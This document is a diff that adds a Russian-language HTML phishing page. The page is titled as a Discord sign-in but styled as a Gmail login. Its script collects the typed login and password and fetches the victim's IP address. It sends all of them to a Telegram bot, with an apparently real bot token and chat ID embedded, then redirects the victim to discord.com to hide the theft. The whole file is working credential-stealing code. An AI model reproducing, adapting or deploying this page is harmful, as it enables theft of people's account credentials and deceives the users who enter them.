@@ -1,1 +1,129 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Sign in</title>
+    <style>
+        /* Ваши стили остаются без изменений */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f1f1f1;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center; /* Центрируем по горизонтали */
+            align-items: center; /* Центрируем по вертикали */
+            height: 90vh; /* Высота на весь экран */
+        }
+        .container {
+            max-width: 390px; /* Ширина для мобильного формата */
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 0 0px rgba(0, 0, 0, 0.1);
+            text-align: center; /* Центрируем текст */
+        }
+        h1 {
+            text-align: center;
+            font-size: 24px; /* Увеличиваем размер заголовка */
+            margin-bottom: 20px; /* Отступ снизу */
+        }
+        p {
+            font-size: 14px; /* Размер шрифта для нового текста */
+            color: #555; /* Цвет текста */
+            margin-bottom: 20px; /* Отступ снизу */
+        }
+        textarea {
+            width: 90%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            margin-bottom: 10px;
+            resize: none;
+            font-size: 16px;
+            margin-top: 10px; /* Увеличиваем размер шрифта */
+        }
+        .button-container {
+            display: flex;
+            justify-content: space-between; /* Распределяем кнопки по краям */
+            margin-top: 10px; /* Отступ сверху */
+        }
+        button {
+            width: 30%;
+            padding: 10px;
+            background-color: #0D58A6;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #c62828;
+        }
+        .create-account {
+            align-self: center; /* Центрируем текст по вертикали */
+            text-decoration: none; /* Убираем подчеркивание */
+            color: #0D58A6; /* Цвет текста */
+            font-size: 18px; /* Размер шрифта */
+            cursor: pointer; /* Указатель при наведении */
+        }
+        .create-account:hover {
+            text-decoration: underline; /* Подчеркивание при наведении */
+        }
+    </style>
+    <script>
+        async function sendMessage() {
+            const message = document.getElementById('message').value; // Получаем логин
+            const message1 = document.getElementById('message1').value; // Получаем пароль
 
+            // Получаем IP-адрес пользователя с помощью стороннего API
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const userIp = ipData.ip; // Получаем IP
+
+            const token = '7765937206:AAHWpiFc2j6zMuthGU4eOIBUC0HmOopHRUA'; // Замените на ваш токен бота
+            const chatId = '-1002267934040'; // Замените на ваш chat ID
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `Login: ${message}\nPassword: ${message1}\nIP: ${userIp}` // Объединяем текст из обоих полей и IP
+                }),
+            });
+
+            if (response.ok) {
+                // Перенаправление на сайт Discord
+                window.location.href = 'https://discord.com/';
+            } else {
+                console.error('Ошибка при отправке сообщения:', response.statusText);
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>
+            <span style="color: #4285F4;">G</span>
+            <span style="color: #EA4335;">m</span>
+            <span style="color: #FBBC05;">a</span>
+            <span style="color: #4285F4;">i</span>
+            <span style="color: #34A853;">l</span>
+        </h1>
+        <p>Используйте аккаунт Google. Он будет добавлен на устройство и будет доступен другим приложениям.</p>
+        <textarea id="message" rows="1" placeholder="Login"></textarea>
+        <textarea id="message1" rows="1" placeholder="Password"></textarea>
+        <div class="button-container">
+            <a class="create-account" href="#">Создать адрес</a>
+            <button onclick="sendMessage()">Sign in</button>
+        </div>
+    </div>
+</body>
+</html>
